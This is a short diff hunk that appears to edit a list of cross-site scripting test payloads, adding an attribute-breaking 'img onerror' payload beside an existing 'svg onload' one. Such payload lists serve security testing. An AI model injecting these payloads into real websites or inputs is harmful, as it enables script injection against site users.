@@ -4,3 +4,4 @@
 -}
 
 (a"><svg/onload=prompt(1)> )
+"><img src=x onerror=alert(document.domain)>
